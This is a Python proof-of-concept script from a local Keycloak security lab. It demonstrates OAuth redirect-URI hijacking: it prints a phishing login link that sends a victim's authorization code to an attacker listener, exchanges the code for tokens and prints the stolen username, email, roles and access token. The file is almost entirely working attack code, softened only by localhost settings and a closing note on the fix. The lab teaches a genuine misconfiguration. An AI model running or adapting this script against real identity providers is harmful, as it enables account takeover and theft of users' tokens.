#!/usr/bin/env python3
"""
Redirect URI hijack (authorization code theft).

vuln-rp registers redirectUris = ["*"], so Keycloak accepts any redirect_uri.
A login link for the legitimate client but with redirect_uri pointing at an
attacker server delivers the victim's authorization code to the attacker. Since
vuln-rp is a public client with no PKCE, the code alone is enough to exchange
for tokens. secure-lab's demo-rp pins one exact redirect_uri and refuses the
malicious link before login. Lab only; everything is localhost.
"""
import base64
import http.server
import json
import socketserver
import urllib.parse
import urllib.request

KC = "http://localhost:8080"
REALM = "vuln-lab"
CLIENT = "vuln-rp"
PORT = 6660
REDIRECT = f"http://localhost:{PORT}/callback"
TOKEN_URL = f"{KC}/realms/{REALM}/protocol/openid-connect/token"

MALICIOUS_LINK = f"{KC}/realms/{REALM}/protocol/openid-connect/auth?" + urllib.parse.urlencode(
    {
        "client_id": CLIENT,
        "response_type": "code",
        "scope": "openid profile email",
        "redirect_uri": REDIRECT,  # <-- attacker-controlled, accepted because redirectUris=["*"]
        "state": "poc02",
    }
)

captured = {"done": False}


def _decode(jwt: str) -> dict:
    p = jwt.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))


def steal(code: str) -> None:
    print(f"\n[attacker] caught authorization code: {code[:24]}...")
    data = urllib.parse.urlencode(
        {
            "grant_type": "authorization_code",
            "client_id": CLIENT,          # public client - no secret needed
            "code": code,
            "redirect_uri": REDIRECT,     # must match the one used in the auth request
        }
    ).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(TOKEN_URL, data=data), timeout=8) as r:
            tok = json.load(r)
    except Exception as e:  # noqa: BLE001
        print(f"[attacker] token exchange failed: {e}")
        return
    at = tok.get("access_token", "")
    if not at:
        print(f"[attacker] no token: {tok}")
        return
    c = _decode(at)
    print("[attacker] *** TOKENS STOLEN - I am now the victim ***")
    print(f"           user:  {c.get('preferred_username')}")
    print(f"           email: {c.get('email')}")
    print(f"           roles: {c.get('realm_access', {}).get('roles')}")
    print(f"           access_token (first 40): {at[:40]}...")


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):  # silence default logging
        pass

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path != "/callback":
            self.send_response(404)
            self.end_headers()
            return
        code = urllib.parse.parse_qs(parsed.query).get("code", [None])[0]
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<h1>Lab: your authorization code was just handed to an attacker.</h1>")
        if code:
            steal(code)
            captured["done"] = True


def main():
    print("=" * 70)
    print("PoC 02 - Redirect URI hijack (attacker listener on port %d)" % PORT)
    print("=" * 70)
    print("\n1) Open this 'phishing' link in your browser and log in as the victim")
    print("   (victim / Password1):\n")
    print("   " + MALICIOUS_LINK)
    print("\n2) Watch below - the code lands here and I exchange it for tokens.\n")
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        while not captured["done"]:
            httpd.handle_request()
    print("\nDone. Fix: register exact redirect URIs (no wildcards); use a")
    print("confidential client and/or enforce PKCE so a stolen code is useless.")


if __name__ == "__main__":
    main()
